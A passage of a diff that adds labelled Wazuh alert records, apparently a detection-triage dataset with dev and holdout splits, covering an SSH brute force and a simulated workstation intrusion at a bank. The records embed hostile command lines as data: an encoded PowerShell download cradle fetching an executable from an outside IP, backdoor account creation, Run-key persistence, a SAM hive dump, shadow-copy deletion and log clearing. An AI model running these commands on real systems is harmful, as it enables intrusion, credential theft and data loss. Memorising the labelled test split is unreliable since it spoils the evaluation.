+     "sshd",
+     "authentication_failures"
+    ],
+    "mitre": {
+     "id": [
+      "T1110"
+     ],
+     "tactic": [
+      "Credential Access"
+     ],
+     "technique": [
+      "Brute Force"
+     ]
+    }
+   },
+   "agent": {
+    "id": "000",
+    "name": "wazuh-server"
+   },
+   "manager": {
+    "name": "wazuh-server"
+   },
+   "id": "1763800000.0000049",
+   "location": "/var/log/auth.log",
+   "full_log": "Nov 22 07:01:10 wazuh-server sshd[909]: Invalid user ubuntu from 203.0.113.77 port 48112",
+   "decoder": {
+    "name": "sshd"
+   },
+   "data": {
+    "srcip": "203.0.113.77",
+    "srcuser": "ubuntu"
+   }
+  },
+  "label": {
+   "threat": true,
+   "scenario": "ssh-bruteforce",
+   "split": "dev",
+   "why": ""
+  }
+ },
+ {
+  "source": "wazuh",
+  "client": "Sahyadri Co-operative Bank",
+  "raw": {
+   "timestamp": "2026-11-22T07:02:00.000+0000",
+   "rule": {
+    "level": 5,
+    "description": "sshd: authentication failed.",
+    "id": "5716",
+    "firedtimes": 1,
+    "mail": false,
+    "groups": [
+     "syslog",
+     "sshd",
+     "authentication_failed"
+    ],
+    "mitre": {
+     "id": [
+      "T1110"
+     ],
+     "tactic": [
+      "Credential Access"
+     ],
+     "technique": [
+      "Brute Force"
+     ]
+    }
+   },
+   "agent": {
+    "id": "000",
+    "name": "wazuh-server"
+   },
+   "manager": {
+    "name": "wazuh-server"
+   },
+   "id": "1763800000.0000050",
+   "location": "/var/log/auth.log",
+   "full_log": "Nov 22 07:02:00 wazuh-server sshd[915]: Failed password for root from 203.0.113.77 port 49001 ssh2",
+   "decoder": {
+    "name": "sshd"
+   },
+   "data": {
+    "srcip": "203.0.113.77",
+    "dstuser": "root"
+   }
+  },
+  "label": {
+   "threat": null,
+   "scenario": "ssh-bruteforce",
+   "split": "dev",
+   "why": ""
+  }
+ },
+ {
+  "source": "wazuh",
+  "client": "Sahyadri Co-operative Bank",
+  "raw": {
+   "timestamp": "2026-11-22T07:02:30.000+0000",
+   "rule": {
+    "level": 10,
+    "description": "sshd: brute force trying to get access to the system. Authentication failed.",
+    "id": "5763",
+    "firedtimes": 1,
+    "mail": false,
+    "groups": [
+     "syslog",
+     "sshd",
+     "authentication_failures"
+    ],
+    "mitre": {
+     "id": [
+      "T1110"
+     ],
+     "tactic": [
+      "Credential Access"
+     ],
+     "technique": [
+      "Brute Force"
+     ]
+    }
+   },
+   "agent": {
+    "id": "000",
+    "name": "wazuh-server"
+   },
+   "manager": {
+    "name": "wazuh-server"
+   },
+   "id": "1763800000.0000051",
+   "location": "/var/log/auth.log",
+   "full_log": "Nov 22 07:02:30 wazuh-server sshd[921]: Failed password for root from 203.0.113.77 port 49044 ssh2",
+   "decoder": {
+    "name": "sshd"
+   },
+   "data": {
+    "srcip": "203.0.113.77",
+    "dstuser": "root"
+   }
+  },
+  "label": {
+   "threat": true,
+   "scenario": "ssh-bruteforce",
+   "split": "holdout",
+   "why": ""
+  }
+ },
+ {
+  "source": "wazuh",
+  "client": "Sahyadri Co-operative Bank",
+  "raw": {
+   "timestamp": "2026-11-22T07:05:00.000+0000",
+   "rule": {
+    "level": 8,
+    "description": "sshd: Possible attack on the ssh server (or version gathering).",
+    "id": "5701",
+    "firedtimes": 1,
+    "mail": false,
+    "groups": [
+     "syslog",
+     "sshd",
+     "recon"
+    ],
+    "mitre": {
+     "id": [
+      "T1190"
+     ],
+     "tactic": [
+      "Initial Access"
+     ],
+     "technique": [
+      "Exploit Public-Facing Application"
+     ]
+    }
+   },
+   "agent": {
+    "id": "000",
+    "name": "wazuh-server"
+   },
+   "manager": {
+    "name": "wazuh-server"
+   },
+   "id": "1763800000.0000052",
+   "location": "/var/log/auth.log",
+   "full_log": "Nov 22 07:05:00 wazuh-server sshd[930]: Bad protocol version identification 'GET / HTTP/1.1' from 198.51.100.200 port 40022",
+   "decoder": {
+    "name": "sshd"
+   },
+   "data": {
+    "srcip": "198.51.100.200"
+   }
+  },
+  "label": {
+   "threat": true,
+   "scenario": "ssh-probe",
+   "split": "holdout",
+   "why": ""
+  }
+ },
+ {
+  "source": "wazuh",
+  "client": "Sahyadri Co-operative Bank",
+  "raw": {
+   "timestamp": "2026-11-22T10:02:10.000+0000",
+   "rule": {
+    "level": 12,
+    "description": "Powershell.exe spawned a powershell process which executed a base64 encoded command",
+    "id": "92057",
+    "firedtimes": 1,
+    "mail": true,
+    "groups": [
+     "sysmon",
+     "sysmon_eid1_detections",
+     "windows"
+    ],
+    "mitre": {
+     "id": [
+      "T1059.001"
+     ],
+     "tactic": [
+      "Execution"
+     ],
+     "technique": [
+      "PowerShell"
+     ]
+    }
+   },
+   "agent": {
+    "id": "001",
+    "name": "SCB-BR2-WKS-014",
+    "ip": "10.20.4.37"
+   },
+   "manager": {
+    "name": "wazuh-server"
+   },
+   "id": "1763800000.0000053",
+   "location": "EventChannel",
+   "decoder": {
+    "name": "windows_eventchannel"
+   },
+   "data": {
+    "win": {
+     "system": {
+      "providerName": "Microsoft-Windows-Sysmon",
+      "eventID": "1",
+      "channel": "Microsoft-Windows-Sysmon/Operational",
+      "computer": "SCB-BR2-WKS-014",
+      "systemTime": "2026-11-22T10:02:10Z",
+      "severityValue": "INFORMATION",
+      "message": "\"Event recorded by Microsoft-Windows-Sysmon. Process Name: C:\\Windows\\System32\\lsass.exe\""
+     },
+     "eventdata": {
+      "utcTime": "2026-11-22 10:02:10.000",
+      "user": "SCB\\a.kulkarni",
+      "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "commandLine": "\"powershell.exe\" -NoP -W Hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA",
+      "parentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "originalFileName": "powershell.exe",
+      "integrityLevel": "High",
+      "hashes": "MD5=0C4F1E0A4A1B3F5E2D7C9B8A6F5E4D3C,SHA256=9F86D081884C7D659A2FEAA0C55AD015A3BF4F1B2B0B822CD15D6C15B0F00A08"
+     }
+    }
+   }
+  },
+  "label": {
+   "threat": true,
+   "scenario": "intrusion",
+   "split": "dev",
+   "why": ""
+  }
+ },
+ {
+  "source": "wazuh",
+  "client": "Sahyadri Co-operative Bank",
+  "raw": {
+   "timestamp": "2026-11-22T10:02:40.000+0000",
+   "rule": {
+    "level": 3,
+    "description": "Discovery activity executed",
+    "id": "92031",
+    "firedtimes": 1,
+    "mail": false,
+    "groups": [
+     "sysmon",
+     "sysmon_eid1_detections",
+     "windows"
+    ],
+    "mitre": {
+     "id": [
+      "T1087"
+     ],
+     "tactic": [
+      "Discovery"
+     ],
+     "technique": [
+      "Account Discovery"
+     ]
+    }
+   },
+   "agent": {
+    "id": "001",
+    "name": "SCB-BR2-WKS-014",
+    "ip": "10.20.4.37"
+   },
+   "manager": {
+    "name": "wazuh-server"
+   },
+   "id": "1763800000.0000054",
+   "location": "EventChannel",
+   "decoder": {
+    "name": "windows_eventchannel"
+   },
+   "data": {
+    "win": {
+     "system": {
+      "providerName": "Microsoft-Windows-Sysmon",
+      "eventID": "1",
+      "channel": "Microsoft-Windows-Sysmon/Operational",
+      "computer": "SCB-BR2-WKS-014",
+      "systemTime": "2026-11-22T10:02:40Z",
+      "severityValue": "INFORMATION",
+      "message": "\"Event recorded by Microsoft-Windows-Sysmon. Process Name: C:\\Windows\\System32\\lsass.exe\""
+     },
+     "eventdata": {
+      "utcTime": "2026-11-22 10:02:40.000",
+      "user": "SCB\\a.kulkarni",
+      "image": "C:\\Windows\\System32\\whoami.exe",
+      "commandLine": "whoami /all",
+      "parentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "originalFileName": "whoami.exe",
+      "integrityLevel": "High",
+      "hashes": "MD5=0C4F1E0A4A1B3F5E2D7C9B8A6F5E4D3C,SHA256=9F86D081884C7D659A2FEAA0C55AD015A3BF4F1B2B0B822CD15D6C15B0F00A08"
+     }
+    }
+   }
+  },
+  "label": {
+   "threat": null,
+   "scenario": "intrusion",
+   "split": "dev",
+   "why": "recon inside an intrusion; closed on its own, kept as context"
+  }
+ },
+ {
+  "source": "wazuh",
+  "client": "Sahyadri Co-operative Bank",
+  "raw": {
+   "timestamp": "2026-11-22T10:02:55.000+0000",
+   "rule": {
+    "level": 3,
+    "description": "A net.exe account discovery command was initiated",
+    "id": "92039",
+    "firedtimes": 1,
+    "mail": false,
+    "groups": [
+     "sysmon",
+     "sysmon_eid1_detections",
+     "windows"
+    ],
+    "mitre": {
+     "id": [
+      "T1087"
+     ],
+     "tactic": [
+      "Discovery"
+     ],
+     "technique": [
+      "Account Discovery"
+     ]
+    }
+   },
+   "agent": {
+    "id": "001",
+    "name": "SCB-BR2-WKS-014",
+    "ip": "10.20.4.37"
+   },
+   "manager": {
+    "name": "wazuh-server"
+   },
+   "id": "1763800000.0000055",
+   "location": "EventChannel",
+   "decoder": {
+    "name": "windows_eventchannel"
+   },
+   "data": {
+    "win": {
+     "system": {
+      "providerName": "Microsoft-Windows-Sysmon",
+      "eventID": "1",
+      "channel": "Microsoft-Windows-Sysmon/Operational",
+      "computer": "SCB-BR2-WKS-014",
+      "systemTime": "2026-11-22T10:02:55Z",
+      "severityValue": "INFORMATION",
+      "message": "\"Event recorded by Microsoft-Windows-Sysmon. Process Name: C:\\Windows\\System32\\lsass.exe\""
+     },
+     "eventdata": {
+      "utcTime": "2026-11-22 10:02:55.000",
+      "user": "SCB\\a.kulkarni",
+      "image": "C:\\Windows\\System32\\net.exe",
+      "commandLine": "net localgroup administrators",
+      "parentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "originalFileName": "net.exe",
+      "integrityLevel": "High",
+      "hashes": "MD5=0C4F1E0A4A1B3F5E2D7C9B8A6F5E4D3C,SHA256=9F86D081884C7D659A2FEAA0C55AD015A3BF4F1B2B0B822CD15D6C15B0F00A08"
+     }
+    }
+   }
+  },
+  "label": {
+   "threat": null,
+   "scenario": "intrusion",
+   "split": "dev",
+   "why": ""
+  }
+ },
+ {
+  "source": "wazuh",
+  "client": "Sahyadri Co-operative Bank",
+  "raw": {
+   "timestamp": "2026-11-22T10:03:20.000+0000",
+   "rule": {
+    "level": 4,
+    "description": "Powershell process spawned powershell instance",
+    "id": "92027",
+    "firedtimes": 1,
+    "mail": false,
+    "groups": [
+     "sysmon",
+     "sysmon_eid1_detections",
+     "windows"
+    ],
+    "mitre": {
+     "id": [
+      "T1059.001"
+     ],
+     "tactic": [
+      "Execution"
+     ],
+     "technique": [
+      "PowerShell"
+     ]
+    }
+   },
+   "agent": {
+    "id": "001",
+    "name": "SCB-BR2-WKS-014",
+    "ip": "10.20.4.37"
+   },
+   "manager": {
+    "name": "wazuh-server"
+   },
+   "id": "1763800000.0000056",
+   "location": "EventChannel",
+   "decoder": {
+    "name": "windows_eventchannel"
+   },
+   "data": {
+    "win": {
+     "system": {
+      "providerName": "Microsoft-Windows-Sysmon",
+      "eventID": "1",
+      "channel": "Microsoft-Windows-Sysmon/Operational",
+      "computer": "SCB-BR2-WKS-014",
+      "systemTime": "2026-11-22T10:03:20Z",
+      "severityValue": "INFORMATION",
+      "message": "\"Event recorded by Microsoft-Windows-Sysmon. Process Name: C:\\Windows\\System32\\lsass.exe\""
+     },
+     "eventdata": {
+      "utcTime": "2026-11-22 10:03:20.000",
+      "user": "SCB\\a.kulkarni",
+      "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "commandLine": "powershell.exe -c \"Invoke-WebRequest -Uri http://198.51.100.44/u.bin -OutFile C:\\Users\\Public\\svc_update.exe\"",
+      "parentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "originalFileName": "powershell.exe",
+      "integrityLevel": "High",
+      "hashes": "MD5=0C4F1E0A4A1B3F5E2D7C9B8A6F5E4D3C,SHA256=9F86D081884C7D659A2FEAA0C55AD015A3BF4F1B2B0B822CD15D6C15B0F00A08"
+     }
+    }
+   }
+  },
+  "label": {
+   "threat": true,
+   "scenario": "intrusion",
+   "split": "dev",
+   "why": "Wazuh rates this level 4; the command line is a download cradle"
+  }
+ },
+ {
+  "source": "wazuh",
+  "client": "Sahyadri Co-operative Bank",
+  "raw": {
+   "timestamp": "2026-11-22T10:03:24.000+0000",
+   "rule": {
+    "level": 15,
+    "description": "Executable file dropped in folder commonly used by malware",
+    "id": "92213",
+    "firedtimes": 1,
+    "mail": true,
+    "groups": [
+     "sysmon",
+     "sysmon_eid11_detections",
+     "windows"
+    ],
+    "mitre": {
+     "id": [
+      "T1105"
+     ],
+     "tactic": [
+      "Command and Control"
+     ],
+     "technique": [
+      "Ingress Tool Transfer"
+     ]
+    }
+   },
+   "agent": {
+    "id": "001",
+    "name": "SCB-BR2-WKS-014",
+    "ip": "10.20.4.37"
+   },
+   "manager": {
+    "name": "wazuh-server"
+   },
+   "id": "1763800000.0000057",
+   "location": "EventChannel",
+   "decoder": {
+    "name": "windows_eventchannel"
+   },
+   "data": {
+    "win": {
+     "system": {
+      "providerName": "Microsoft-Windows-Sysmon",
+      "eventID": "11",
+      "channel": "Microsoft-Windows-Sysmon/Operational",
+      "computer": "SCB-BR2-WKS-014",
+      "systemTime": "2026-11-22T10:03:24Z",
+      "severityValue": "INFORMATION",
+      "message": "\"Event recorded by Microsoft-Windows-Sysmon. Process Name: C:\\Windows\\System32\\lsass.exe\""
+     },
+     "eventdata": {
+      "utcTime": "2026-11-22 10:03:24.000",
+      "user": "SCB\\a.kulkarni",
+      "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "targetFilename": "C:\\Users\\Public\\svc_update.exe"
+     }
+    }
+   }
+  },
+  "label": {
+   "threat": true,
+   "scenario": "intrusion",
+   "split": "dev",
+   "why": ""
+  }
+ },
+ {
+  "source": "wazuh",
+  "client": "Sahyadri Co-operative Bank",
+  "raw": {
+   "timestamp": "2026-11-22T10:04:05.000+0000",
+   "rule": {
+    "level": 12,
+    "description": "net1.exe executed a user creation command",
+    "id": "92040",
+    "firedtimes": 1,
+    "mail": true,
+    "groups": [
+     "sysmon",
+     "sysmon_eid1_detections",
+     "windows"
+    ],
+    "mitre": {
+     "id": [
+      "T1136.001"
+     ],
+     "tactic": [
+      "Persistence"
+     ],
+     "technique": [
+      "Local Account"
+     ]
+    }
+   },
+   "agent": {
+    "id": "001",
+    "name": "SCB-BR2-WKS-014",
+    "ip": "10.20.4.37"
+   },
+   "manager": {
+    "name": "wazuh-server"
+   },
+   "id": "1763800000.0000058",
+   "location": "EventChannel",
+   "decoder": {
+    "name": "windows_eventchannel"
+   },
+   "data": {
+    "win": {
+     "system": {
+      "providerName": "Microsoft-Windows-Sysmon",
+      "eventID": "1",
+      "channel": "Microsoft-Windows-Sysmon/Operational",
+      "computer": "SCB-BR2-WKS-014",
+      "systemTime": "2026-11-22T10:04:05Z",
+      "severityValue": "INFORMATION",
+      "message": "\"Event recorded by Microsoft-Windows-Sysmon. Process Name: C:\\Windows\\System32\\lsass.exe\""
+     },
+     "eventdata": {
+      "utcTime": "2026-11-22 10:04:05.000",
+      "user": "SCB\\a.kulkarni",
+      "image": "C:\\Windows\\System32\\net1.exe",
+      "commandLine": "C:\\Windows\\system32\\net1 user svc_backup P@ssw0rd!23 /add",
+      "parentImage": "C:\\Windows\\System32\\net.exe",
+      "originalFileName": "net1.exe",
+      "integrityLevel": "High",
+      "hashes": "MD5=0C4F1E0A4A1B3F5E2D7C9B8A6F5E4D3C,SHA256=9F86D081884C7D659A2FEAA0C55AD015A3BF4F1B2B0B822CD15D6C15B0F00A08"
+     }
+    }
+   }
+  },
+  "label": {
+   "threat": true,
+   "scenario": "intrusion",
+   "split": "dev",
+   "why": ""
+  }
+ },
+ {
+  "source": "wazuh",
+  "client": "Sahyadri Co-operative Bank",
+  "raw": {
+   "timestamp": "2026-11-22T10:04:05.000+0000",
+   "rule": {
+    "level": 8,
+    "description": "User account enabled or created",
+    "id": "60109",
+    "firedtimes": 1,
+    "mail": false,
+    "groups": [
+     "windows",
+     "windows_security",
+     "adduser",
+     "account_changed"
+    ],
+    "mitre": {
+     "id": [
+      "T1098"
+     ],
+     "tactic": [
+      "Persistence",
+      "Privilege Escalation"
+     ],
+     "technique": [
+      "Account Manipulation"
+     ]
+    }
+   },
+   "agent": {
+    "id": "001",
+    "name": "SCB-BR2-WKS-014",
+    "ip": "10.20.4.37"
+   },
+   "manager": {
+    "name": "wazuh-server"
+   },
+   "id": "1763800000.0000059",
+   "location": "EventChannel",
+   "decoder": {
+    "name": "windows_eventchannel"
+   },
+   "data": {
+    "win": {
+     "system": {
+      "providerName": "Microsoft-Windows-Security-Auditing",
+      "eventID": "4720",
+      "channel": "Security",
+      "computer": "SCB-BR2-WKS-014",
+      "systemTime": "2026-11-22T10:04:05Z",
+      "severityValue": "INFORMATION",
+      "message": "\"Event recorded by Microsoft-Windows-Security-Auditing. Process Name: C:\\Windows\\System32\\lsass.exe\""
+     },
+     "eventdata": {
+      "subjectUserName": "a.kulkarni",
+      "subjectDomainName": "SCB",
+      "targetUserName": "svc_backup",
+      "targetDomainName": "SCB-BR2-WKS-014"
+     }
+    }
+   }
+  },
+  "label": {
+   "threat": true,
+   "scenario": "intrusion",
+   "split": "dev",
+   "why": ""
+  }
+ },
+ {
+  "source": "wazuh",
+  "client": "Sahyadri Co-operative Bank",
+  "raw": {
+   "timestamp": "2026-11-22T10:04:30.000+0000",
+   "rule": {
+    "level": 12,
+    "description": "Administrators Group Changed",
+    "id": "60154",
+    "firedtimes": 1,
+    "mail": true,
+    "groups": [
+     "windows",
+     "windows_security",
+     "group_changed",
+     "win_group_changed"
+    ],
+    "mitre": {
+     "id": [
+      "T1484"
+     ],
+     "tactic": [
+      "Defense Evasion",
+      "Privilege Escalation"
+     ],
+     "technique": [
+      "Domain or Tenant Policy Modification"
+     ]
+    }
+   },
+   "agent": {
+    "id": "001",
+    "name": "SCB-BR2-WKS-014",
+    "ip": "10.20.4.37"
+   },
+   "manager": {
+    "name": "wazuh-server"
+   },
+   "id": "1763800000.0000060",
+   "location": "EventChannel",
+   "decoder": {
+    "name": "windows_eventchannel"
+   },
+   "data": {
+    "win": {
+     "system": {
+      "providerName": "Microsoft-Windows-Security-Auditing",
+      "eventID": "4732",
+      "channel": "Security",
+      "computer": "SCB-BR2-WKS-014",
+      "systemTime": "2026-11-22T10:04:30Z",
+      "severityValue": "INFORMATION",
+      "message": "\"Event recorded by Microsoft-Windows-Security-Auditing. Process Name: C:\\Windows\\System32\\lsass.exe\""
+     },
+     "eventdata": {
+      "subjectUserName": "a.kulkarni",
+      "subjectDomainName": "SCB",
+      "targetUserName": "Administrators",
+      "memberSid": "S-1-5-21-1-2-3-1009"
+     }
+    }
+   }
+  },
+  "label": {
+   "threat": true,
+   "scenario": "intrusion",
+   "split": "dev",
+   "why": ""
+  }
+ },
+ {
+  "source": "wazuh",
+  "client": "Sahyadri Co-operative Bank",
+  "raw": {
+   "timestamp": "2026-11-22T10:05:00.000+0000",
+   "rule": {
+    "level": 6,
+    "description": "Registry entry to be executed on next logon was modified using command line application reg.exe",
+    "id": "92302",
+    "firedtimes": 1,
+    "mail": false,
+    "groups": [
+     "sysmon",
+     "sysmon_eid13_detections",
+     "windows"
+    ],
+    "mitre": {
+     "id": [
+      "T1547.001"
+     ],
+     "tactic": [
+      "Persistence",
+      "Privilege Escalation"
+     ],
+     "technique": [
+      "Registry Run Keys / Startup Folder"
+     ]
+    }
+   },
+   "agent": {
+    "id": "001",
+    "name": "SCB-BR2-WKS-014",
+    "ip": "10.20.4.37"
+   },
+   "manager": {
+    "name": "wazuh-server"
+   },
+   "id": "1763800000.0000061",
+   "location": "EventChannel",
+   "decoder": {
+    "name": "windows_eventchannel"
+   },
+   "data": {
+    "win": {
+     "system": {
+      "providerName": "Microsoft-Windows-Sysmon",
+      "eventID": "13",
+      "channel": "Microsoft-Windows-Sysmon/Operational",
+      "computer": "SCB-BR2-WKS-014",
+      "systemTime": "2026-11-22T10:05:00Z",
+      "severityValue": "INFORMATION",
+      "message": "\"Event recorded by Microsoft-Windows-Sysmon. Process Name: C:\\Windows\\System32\\lsass.exe\""
+     },
+     "eventdata": {
+      "utcTime": "2026-11-22 10:05:00.000",
+      "user": "SCB\\a.kulkarni",
+      "image": "C:\\Windows\\System32\\reg.exe",
+      "eventType": "SetValue",
+      "targetObject": "HKU\\S-1-5-21-1-2-3-1001\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Updater",
+      "details": "C:\\Users\\Public\\svc_update.exe"
+     }
+    }
+   }
+  },
+  "label": {
+   "threat": true,
+   "scenario": "intrusion",
+   "split": "dev",
+   "why": "Wazuh rates run-key persistence level 6 (low)"
+  }
+ },
+ {
+  "source": "wazuh",
+  "client": "Sahyadri Co-operative Bank",
+  "raw": {
+   "timestamp": "2026-11-22T14:10:00.000+0000",
+   "rule": {
+    "level": 14,
+    "description": "Reg.exe used to dump SAM hive",
+    "id": "92026",
+    "firedtimes": 1,
+    "mail": true,
+    "groups": [
+     "sysmon",
+     "sysmon_eid1_detections",
+     "windows"
+    ],
+    "mitre": {
+     "id": [
+      "T1003.002"
+     ],
+     "tactic": [
+      "Credential Access"
+     ],
+     "technique": [
+      "Security Account Manager"
+     ]
+    }
+   },
+   "agent": {
+    "id": "001",
+    "name": "SCB-BR2-WKS-014",
+    "ip": "10.20.4.37"
+   },
+   "manager": {
+    "name": "wazuh-server"
+   },
+   "id": "1763800000.0000062",
+   "location": "EventChannel",
+   "decoder": {
+    "name": "windows_eventchannel"
+   },
+   "data": {
+    "win": {
+     "system": {
+      "providerName": "Microsoft-Windows-Sysmon",
+      "eventID": "1",
+      "channel": "Microsoft-Windows-Sysmon/Operational",
+      "computer": "SCB-BR2-WKS-014",
+      "systemTime": "2026-11-22T14:10:00Z",
+      "severityValue": "INFORMATION",
+      "message": "\"Event recorded by Microsoft-Windows-Sysmon. Process Name: C:\\Windows\\System32\\lsass.exe\""
+     },
+     "eventdata": {
+      "utcTime": "2026-11-22 14:10:00.000",
+      "user": "SCB\\a.kulkarni",
+      "image": "C:\\Windows\\System32\\reg.exe",
+      "commandLine": "reg.exe save hklm\\sam C:\\Users\\Public\\s.hiv",
+      "parentImage": "C:\\Windows\\System32\\cmd.exe",
+      "originalFileName": "reg.exe",
+      "integrityLevel": "High",
+      "hashes": "MD5=0C4F1E0A4A1B3F5E2D7C9B8A6F5E4D3C,SHA256=9F86D081884C7D659A2FEAA0C55AD015A3BF4F1B2B0B822CD15D6C15B0F00A08"
+     }
+    }
+   }
+  },
+  "label": {
+   "threat": true,
+   "scenario": "cred-theft",
+   "split": "holdout",
+   "why": ""
+  }
+ },
+ {
+  "source": "wazuh",
+  "client": "Sahyadri Co-operative Bank",
+  "raw": {
+   "timestamp": "2026-11-22T14:10:40.000+0000",
+   "rule": {
+    "level": 12,
+    "description": "Local Security Authority Subsystem Service (LSASS) process was accessed by C:\\\\Users\\\\Public\\\\upd.exe, possible code injection for credential dumping",
+    "id": "92403",
+    "firedtimes": 1,
+    "mail": true,
+    "groups": [
+     "sysmon",
+     "sysmon_eid8_detections",
+     "windows"
+    ],
+    "mitre": {
+     "id": [
+      "T1055"
+     ],
+     "tactic": [
+      "Defense Evasion",
+      "Privilege Escalation"
+     ],
+     "technique": [
+      "Process Injection"
+     ]
+    }
+   },
+   "agent": {
+    "id": "001",
+    "name": "SCB-BR2-WKS-014",
+    "ip": "10.20.4.37"
+   },
+   "manager": {
+    "name": "wazuh-server"
+   },
+   "id": "1763800000.0000063",
+   "location": "EventChannel",
+   "decoder": {
+    "name": "windows_eventchannel"
+   },
+   "data": {
+    "win": {
+     "system": {
+      "providerName": "Microsoft-Windows-Sysmon",
+      "eventID": "8",
+      "channel": "Microsoft-Windows-Sysmon/Operational",
+      "computer": "SCB-BR2-WKS-014",
+      "systemTime": "2026-11-22T14:10:40Z",
+      "severityValue": "INFORMATION",
+      "message": "\"Event recorded by Microsoft-Windows-Sysmon. Process Name: C:\\Windows\\System32\\lsass.exe\""
+     },
+     "eventdata": {
+      "utcTime": "2026-11-22 14:10:40.000",
+      "user": "SCB\\a.kulkarni",
+      "sourceImage": "C:\\Users\\Public\\upd.exe",
+      "targetImage": "C:\\Windows\\System32\\lsass.exe"
+     }
+    }
+   }
+  },
+  "label": {
+   "threat": true,
+   "scenario": "cred-theft",
+   "split": "holdout",
+   "why": ""
+  }
+ },
+ {
+  "source": "wazuh",
+  "client": "Sahyadri Co-operative Bank",
+  "raw": {
+   "timestamp": "2026-11-22T14:11:00.000+0000",
+   "rule": {
+    "level": 12,
+    "description": "Windows Defender: Antimalware platform detected Severe potentially unwanted software (C:\\\\Users\\\\Public\\\\upd.exe)",
+    "id": "62123",
+    "firedtimes": 1,
+    "mail": true,
+    "groups": [
+     "windows",
+     "windows_defender"
+    ]
+   },
+   "agent": {
+    "id": "001",
+    "name": "SCB-BR2-WKS-014",
+    "ip": "10.20.4.37"
+   },
+   "manager": {
+    "name": "wazuh-server"
+   },
+   "id": "1763800000.0000064",
+   "location": "EventChannel",
+   "decoder": {
+    "name": "windows_eventchannel"
+   },
+   "data": {
+    "win": {
+     "system": {
+      "providerName": "Microsoft-Windows-Windows Defender",
+      "eventID": "1116",
+      "channel": "Microsoft-Windows-Windows Defender/Operational",
+      "computer": "SCB-BR2-WKS-014",
+      "systemTime": "2026-11-22T14:11:00Z",
+      "severityValue": "INFORMATION",
+      "message": "\"Event recorded by Microsoft-Windows-Windows Defender. Process Name: C:\\Windows\\System32\\lsass.exe\""
+     },
+     "eventdata": {
+      "threatName": "HackTool:Win32/Mimikatz!dha",
+      "severityName": "Severe",
+      "processName": "C:\\Users\\Public\\upd.exe",
+      "path": "file:_C:\\Users\\Public\\upd.exe"
+     }
+    }
+   }
+  },
+  "label": {
+   "threat": true,
+   "scenario": "cred-theft",
+   "split": "holdout",
+   "why": ""
+  }
+ },
+ {
+  "source": "wazuh",
+  "client": "Sahyadri Co-operative Bank",
+  "raw": {
+   "timestamp": "2026-11-22T14:12:00.000+0000",
+   "rule": {
+    "level": 4,
+    "description": "Windows command prompt started by an abnormal process",
+    "id": "92052",
+    "firedtimes": 1,
+    "mail": false,
+    "groups": [
+     "sysmon",
+     "sysmon_eid1_detections",
+     "windows"
+    ],
+    "mitre": {
+     "id": [
+      "T1059.003"
+     ],
+     "tactic": [
+      "Execution"
+     ],
+     "technique": [
+      "Windows Command Shell"
+     ]
+    }
+   },
+   "agent": {
+    "id": "001",
+    "name": "SCB-BR2-WKS-014",
+    "ip": "10.20.4.37"
+   },
+   "manager": {
+    "name": "wazuh-server"
+   },
+   "id": "1763800000.0000065",
+   "location": "EventChannel",
+   "decoder": {
+    "name": "windows_eventchannel"
+   },
+   "data": {
+    "win": {
+     "system": {
+      "providerName": "Microsoft-Windows-Sysmon",
+      "eventID": "1",
+      "channel": "Microsoft-Windows-Sysmon/Operational",
+      "computer": "SCB-BR2-WKS-014",
+      "systemTime": "2026-11-22T14:12:00Z",
+      "severityValue": "INFORMATION",
+      "message": "\"Event recorded by Microsoft-Windows-Sysmon. Process Name: C:\\Windows\\System32\\lsass.exe\""
+     },
+     "eventdata": {
+      "utcTime": "2026-11-22 14:12:00.000",
+      "user": "SCB\\a.kulkarni",
+      "image": "C:\\Windows\\System32\\cmd.exe",
+      "commandLine": "cmd.exe /c vssadmin delete shadows /all /quiet",
+      "parentImage": "C:\\Users\\Public\\upd.exe",
+      "originalFileName": "cmd.exe",
+      "integrityLevel": "High",
+      "hashes": "MD5=0C4F1E0A4A1B3F5E2D7C9B8A6F5E4D3C,SHA256=9F86D081884C7D659A2FEAA0C55AD015A3BF4F1B2B0B822CD15D6C15B0F00A08"
+     }
+    }
+   }
+  },
+  "label": {
+   "threat": true,
+   "scenario": "cred-theft",
+   "split": "holdout",
+   "why": "Wazuh rates this level 4; the command deletes shadow copies"
+  }
+ },
+ {
+  "source": "wazuh",
+  "client": "Sahyadri Co-operative Bank",
+  "raw": {
+   "timestamp": "2026-11-22T14:13:00.000+0000",
+   "rule": {
+    "level": 9,
+    "description": "Windows audit log was cleared",
+    "id": "60117",
+    "firedtimes": 1,
+    "mail": false,
+    "groups": [
+     "windows",
+     "windows_security",
+     "logs_cleared"
+    ],
+    "mitre": {
+     "id": [
+      "T1070.004"
+     ],
+     "tactic": [
+      "Defense Evasion"
+     ],
+     "technique": [
+      "File Deletion"
+     ]
+    }
+   },
+   "agent": {
+    "id": "001",
+    "name": "SCB-BR2-WKS-014",
+    "ip": "10.20.4.37"
+   },
+   "manager": {
+    "name": "wazuh-server"
+   },
+   "id": "1763800000.0000066",
+   "location": "EventChannel",
+   "decoder": {
+    "name": "windows_eventchannel"
+   },
+   "data": {
+    "win": {
+     "system": {
+      "providerName": "Microsoft-Windows-Eventlog",
+      "eventID": "1102",
+      "channel": "Security",
+      "computer": "SCB-BR2-WKS-014",
+      "systemTime": "2026-11-22T14:13:00Z",
+      "severityValue": "INFORMATION",
+      "message": "\"Event recorded by Microsoft-Windows-Eventlog. Process Name: C:\\Windows\\System32\\lsass.exe\""
+     },
+     "eventdata": {
+      "subjectUserName": "a.kulkarni",
+      "subjectDomainName": "SCB"
+     }
+    }
+   }
+  },
+  "label": {
+   "threat": true,
+   "scenario": "cred-theft",
+   "split": "holdout",
+   "why": ""
+  }
+ },
+ {
+  "source": "wazuh",
+  "client": "Sahyadri Co-operative Bank",
+  "raw": {
+   "timestamp": "2026-11-22T14:20:01.000+0000",
+   "rule": {
+    "level": 5,
